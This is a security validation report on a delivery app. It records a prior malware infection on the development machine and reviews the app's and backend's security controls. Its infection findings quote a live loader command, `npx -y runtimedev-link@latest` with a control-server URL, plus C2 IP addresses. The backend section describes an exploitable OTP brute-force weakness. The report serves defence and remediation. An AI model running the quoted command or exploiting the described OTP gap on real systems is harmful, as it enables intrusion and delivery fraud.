# Security Validation Report — Bulkimart Delivery app

Date: 2026-11-01. Read-only inspection. No project code, package script or build tool was executed.

## 1. Security gate (development machine) — **FAIL**

| Check | Finding | Result |
|---|---|---|
| Defender service | Real-time protection on; signatures 2026-10-31; quick scan 2026-11-01 07:56 | PASS |
| Defender history | Repeated blocks (2026-10-26) of `node.exe -e …` loader beaconing to `95.135.181.151` (obfuscated, downloads and `eval`s a second stage); 2026-10-31 detection in `D:\Appzeto_Projects\WedmeGood1\Frontend\vite.config.js` | FAIL (prior infection) |
| Persistence files | **Still present**: `%USERPROFILE%\.local\share\runtimedev-link\start.vbs` + `runtimedev-link.task.xml`, `%USERPROFILE%\.config\runtimedev-link\agent.env(.bat)` (2026-10-31 10:04). `start.vbs` runs `npx -y runtimedev-link@latest --token http://194.11.226.41:4000\|…` hidden; the XML is a logon task template | FAIL |
| Scheduled task | No registered task named runtimedev/sstar; no non-Microsoft task runs node/wscript | PASS |
| Run keys / Startup folder | Only known vendor entries (OneDrive, Edge, Chrome, Firefox, Adobe, audio, Cloudflare WARP) | PASS |
| Live C2 connections | None to 95.135.181.151 or 194.11.226.41 at inspection time | PASS |
| npx cache | No cached `runtimedev-link` package | PASS |
| Other payload | `D:\Appzeto_Projects\safe-fire\frontend\postcss.config.js` (13,099 bytes) still present | FAIL |
| OS | Installed 2026-02-17, not reinstalled since the infection | FAIL |
| This repository | No IOC strings outside docs; config files small and readable; no install/prepare lifecycle scripts in any package.json; the known malicious `vite.config.js` copy is quarantined under git-ignored `test-artifacts/` | PASS |
| Running processes | Metro for `mobile-user` and an `npm install --ignore-scripts` were running (started outside this session) | Note |

**Gate result: FAIL.** No Node/npm/npx/Metro/Gradle was run in this session. Recommended before any build:
1. Delete the `runtimedev-link` folders and the `safe-fire` payload (not done here — owner's decision), full offline Defender scan.
2. Treat every credential used on this machine since 2026-10-13 as exposed (Git, npm, Firebase, MongoDB, cloud, `.env` secrets) and rotate them.
3. Prefer a reinstalled or separate clean machine for building and signing.
4. Stop the Node processes started on this machine.

## 2. App security controls (source review)

| Area | Control | Status |
|---|---|---|
| Environment isolation | Debug → staging only; staging URL unset → all requests blocked (`API_NOT_CONFIGURED`), no production fallback. Release → production. HTTPS required. | Implemented — NOT RUN |
| Secrets | No keys or secrets in source. Firebase config and keystores git-ignored. Release signing only via git-ignored `keystore.properties`. | PASS (static) |
| Token storage | Android Keystore via react-native-keychain, device-only; cleared on sign-out/401 | Implemented — NOT RUN |
| Session validation | Delivery session role checked at login and restore | Implemented — NOT RUN |
| Data isolation | Every rider query is scoped server-side by the token's partner (`req.partner`, socket room from token) — verified in controllers | PASS (static) |
| OTP | Delivery code never shown to the rider (server never returns it); mock login code shown only in debug builds | PASS (static) |
| COD tampering | App requires exact server amount; server re-validates amount limits on recording. See S2 for the remaining gap | Partial |
| Duplicate actions | In-flight guards on every mutation; payout idempotency key reused across retries; server completion idempotent | Implemented — NOT RUN |
| Location privacy | Foreground only; no background permission; visible notice while sharing; stops in background | Implemented — NOT RUN |
| KYC | Uploads only (5 MB, JPEG/PNG/WEBP); documents never displayed; account numbers masked | Implemented — NOT RUN |
| Logging | No `console.log` of tokens, OTPs, bank or KYC data (ErrorBoundary logs only a message in dev) | PASS (static) |
| Network security | `usesCleartextTraffic` false for release (RN Gradle placeholder); `allowBackup=false` | PASS (static) |
| Deep links | No deep-link intent filters declared; push routes limited to a `/delivery/*` allow-list | PASS (static) |
| Notification routing | Untrusted `route` values fall back to the inbox | PASS (static, unit test written) |
| Dependency audit | `npm audit` | NOT RUN |

## 3. Backend findings (not changed — owner decision and staging tests required)

| # | Severity | Finding | Recommendation |
|---|---|---|---|
| S1 | High | Forward delivery OTP can be brute-forced: `generateDeliveryOtp` resets `otpAttempts` to 0 on every call, has no cooldown and no cap, so a rider can cycle 5 guesses per regeneration over 10,000 codes. Uses `Math.random`. Return pickups already use `crypto.randomInt` + 60 s cooldown. | Mirror the return-pickup code: `crypto.randomInt`, conditional update with 60 s cooldown, and a total-attempt cap per delivery. |
| S2 | High | `verifyDeliveryOtp` completes COD orders regardless of the cash amount (or with none); cash is recorded after completion and failures are tolerated (asserted by test "a failed cash record never undoes the delivery"). Conflicts with the requirement "do not mark delivered if the payable amount does not match". | Business decision. If approved: before the transaction, for `financialSnapshot.version === 2` COD orders require `Math.round(codCollected)*100 === codCashDuePaise(expectedPaise)`; update the two financial-workflow tests. |
| S3 | Medium | `verifyDeliveryOtp` / `generateDeliveryOtp` do not check the stage: a delivery can be completed without `picked_up` via direct API calls. | Require `status ∈ {picked_up, in_transit, arrived_at_customer}` in the update filter; update `delivery-otp.http.test.js` filter assertion. |
| S4 | Medium | Login OTP (`sendOTP`) uses `Math.random`. | Use `crypto.randomInt`. |
| S5 | Medium | `GET /api/delivery/me` returns the full bank account number, document URLs and UPI ID. The app masks them, but the API exposes them to any holder of the token. | Return masked account and document presence flags; serve documents via signed URLs to admins only. |
| S6 | Low | `generateDeliveryOtp` puts the OTP in the customer's notification message text while the code comment says it must not. | Decide intended behaviour; align code and comment. |
| S7 | Low | `listReturnPickups` returns customer shipping addresses for *offers* (before acceptance). | Limit pending offers to area/distance as forward offers do. |

## 4. Not executed

Dependency vulnerability scan, runtime security tests, MITM/TLS checks, token-expiry test, rooted-device checks — **NOT RUN** (gate).
